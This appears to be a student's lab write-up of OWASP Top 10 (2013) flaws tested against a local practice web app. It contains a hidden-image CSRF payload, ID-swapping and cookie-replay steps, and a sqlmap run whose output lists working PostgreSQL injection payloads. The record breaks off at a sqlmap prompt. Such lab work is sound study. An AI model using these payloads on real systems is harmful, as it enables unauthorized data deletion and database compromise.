@@ -1,0 +1,194 @@
+All info from: https://www.owasp.org/index.php/Top_10_2013-Top_10
+
+
+A8: CSRF (Cross Site Request Forgery)
+========================================
+
+A CSRF attack forces a logged-on victim’s browser to send a forged HTTP request, including the victim’s session cookie and any other automatically included authentication information, to a vulnerable web application. This allows the attacker to force the victim’s browser to generate requests the vulnerable application thinks are legitimate requests from the victim. 
+
+Example under A8.html 
+
+<img src="http://10.10.10.128/fourFours/index.php?operation=deleteExpression&expressionId=13&accountId=2" width="0" height="0" />
+
+
+A6: SENSITIVE DATA EXPOSURE
+========================================
+
+Passwords need to be hashed and salted in order to be secure. The password database uses unsalted hashes to store everyone’s passwords. A file upload flaw allows an attacker to retrieve the password file. All of the unsalted hashes can be exposed with a rainbow table of precalculated hashes.  
+
+A site simply doesn’t use SSL for all authenticated pages. Attacker simply monitors network traffic (like an open wireless network), and steals the user’s session cookie. Attacker then replays this cookie and hijacks the user’s session, accessing the user’s private data. 
+
+SSL needs to be activated in order to secure communications.
+
+This can be achieved by adusting the httpd.conf file when using apache and installing certificates.
+Following the link below will walk you through setting up ssl in order to secure communications. 
+
+Link: https://www.sslshopper.com/apache-server-ssl-installation-instructions.html
+
+
+
+A2: SESSION FIXATION
+========================================
+
+Application functions related to authentication and session management are often not implemented correctly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users’ identities.
+
+See A2.png
+
+Copying the cookie from the user in the firefox browser allowed me to access the users profile from the chrome browser.
+
+
+A4: INSECURE DIRECT OBJECT REFERENCES
+========================================
+
+A direct object reference occurs when a developer exposes a reference to an internal implementation object, such as a file, directory, or database key. Without an access control check or other protection, attackers can manipulate these references to access unauthorized data. 
+
+Logged in as: 
+Anne Lion where ID is 2. 
+
+http://10.10.10.128/fourFours/index.php?operation=deleteExpression&expressionId=15&accountId=2
+
+Change to a different ID in order to delete another users info.
+
+http://10.10.10.128/fourFours/index.php?operation=deleteExpression&expressionId=15&accountId=8
+
+
+A3: XSS
+========================================
+
+XSS flaws occur whenever an application takes untrusted data and sends it to a web browser without proper validation or escaping. XSS allows attackers to execute scripts in the victim’s browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites. 
+
+Inserted " <a href="http://www.utm.utoronto.ca/">This is a link</a> " into the form.
+Output is a link. See A3.png
+
+
+
+A1: SQL Injection
+========================================
+
+Injection flaws, such as SQL, OS, and LDAP injection occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.
+
+** USE SQLMAP in KALI
+
+python sqlmap.py -u "http://10.10.10.128/fourFours/index.php?operation=deleteExpression&expressionId=15&accountId=2" -f --banner --dbs --users
+
+OUTPUT BELOW
+===================================================================
+
+       __H__
+ ___ ___[(]_____ ___ ___  {1.1.11.21#dev}
+|_ -| . ["]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 22:42:16
+
+[22:42:16] [INFO] testing connection to the target URL
+[22:42:16] [INFO] heuristics detected web page charset 'ascii'
+[22:42:16] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[22:42:16] [INFO] testing if the target URL is stable
+[22:42:17] [INFO] target URL is stable
+[22:42:17] [INFO] testing if GET parameter 'operation' is dynamic
+[22:42:17] [WARNING] GET parameter 'operation' does not appear to be dynamic
+[22:42:17] [WARNING] heuristic (basic) test shows that GET parameter 'operation' might not be injectable
+[22:42:17] [INFO] testing for SQL injection on GET parameter 'operation'
+[22:42:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[22:42:17] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'
+[22:42:17] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[22:42:17] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[22:42:17] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[22:42:17] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[22:42:17] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[22:42:17] [INFO] testing 'MySQL inline queries'
+[22:42:17] [INFO] testing 'PostgreSQL inline queries'
+[22:42:17] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+[22:42:17] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[22:42:17] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[22:42:17] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[22:42:17] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+[22:42:17] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[22:42:17] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[22:42:17] [INFO] testing 'Oracle AND time-based blind'
+[22:42:17] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[22:42:17] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it with option '--dbms'
+[22:42:18] [WARNING] GET parameter 'operation' does not seem to be injectable
+[22:42:18] [INFO] testing if GET parameter 'expressionId' is dynamic
+[22:42:18] [WARNING] GET parameter 'expressionId' does not appear to be dynamic
+[22:42:18] [INFO] heuristic (basic) test shows that GET parameter 'expressionId' might be injectable (possible DBMS: 'PostgreSQL')
+[22:42:18] [INFO] testing for SQL injection on GET parameter 'expressionId'
+it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] y
+[22:42:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[22:42:27] [WARNING] reflective value(s) found and filtering out
+[22:42:27] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[22:42:28] [INFO] GET parameter 'expressionId' appears to be 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' injectable (with --not-string="37")
+[22:42:28] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[22:42:28] [INFO] GET parameter 'expressionId' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable 
+[22:42:28] [INFO] testing 'PostgreSQL inline queries'
+[22:42:28] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[22:42:28] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
+[22:42:28] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
+[22:42:28] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
+[22:42:28] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
+[22:42:28] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
+[22:42:28] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[22:42:38] [INFO] GET parameter 'expressionId' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable 
+[22:42:38] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[22:42:38] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+GET parameter 'expressionId' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
+[22:42:49] [INFO] testing if GET parameter 'accountId' is dynamic
+[22:42:49] [WARNING] GET parameter 'accountId' does not appear to be dynamic
+[22:42:50] [INFO] heuristic (basic) test shows that GET parameter 'accountId' might be injectable (possible DBMS: 'PostgreSQL')
+[22:42:50] [INFO] testing for SQL injection on GET parameter 'accountId'
+[22:42:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[22:42:50] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[22:42:50] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[22:42:50] [INFO] GET parameter 'accountId' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable 
+[22:42:50] [INFO] testing 'PostgreSQL inline queries'
+[22:42:50] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[22:42:50] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
+[22:42:50] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
+[22:42:50] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
+[22:42:50] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
+[22:42:50] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
+[22:42:50] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[22:43:00] [INFO] GET parameter 'accountId' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable 
+[22:43:00] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+GET parameter 'accountId' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+sqlmap identified the following injection point(s) with a total of 271 HTTP(s) requests:
+---
+Parameter: accountId (GET)
+    Type: boolean-based blind
+    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
+    Payload: operation=deleteExpression&expressionId=15&accountId=2 AND (SELECT (CASE WHEN (5596=5596) THEN NULL ELSE CAST((CHR(103)||CHR(101)||CHR(122)||CHR(73)) AS NUMERIC) END)) IS NULL
+
+    Type: error-based
+    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+    Payload: operation=deleteExpression&expressionId=15&accountId=2 AND 9620=CAST((CHR(113)||CHR(107)||CHR(112)||CHR(113)||CHR(113))||(SELECT (CASE WHEN (9620=9620) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(98)||CHR(122)||CHR(113)) AS NUMERIC)
+
+    Type: AND/OR time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: operation=deleteExpression&expressionId=15&accountId=2 AND 4946=(SELECT 4946 FROM PG_SLEEP(5))
+
+Parameter: expressionId (GET)
+    Type: boolean-based blind
+    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
+    Payload: operation=deleteExpression&expressionId=15 AND (SELECT (CASE WHEN (4071=4071) THEN NULL ELSE CAST((CHR(77)||CHR(74)||CHR(89)||CHR(89)) AS NUMERIC) END)) IS NULL&accountId=2
+
+    Type: error-based
+    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+    Payload: operation=deleteExpression&expressionId=15 AND 2596=CAST((CHR(113)||CHR(107)||CHR(112)||CHR(113)||CHR(113))||(SELECT (CASE WHEN (2596=2596) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(98)||CHR(122)||CHR(113)) AS NUMERIC)&accountId=2
+
+    Type: AND/OR time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: operation=deleteExpression&expressionId=15 AND 7878=(SELECT 7878 FROM PG_SLEEP(5))&accountId=2
+---
+there were multiple injection points, please select the one to use for following injections:
+[0] place: GET, parameter: expressionId, type: Unescaped numeric (default)
+[1] place: GET, parameter: accountId, type: Unescaped numeric
+[q] Quit
+c
+
+
+
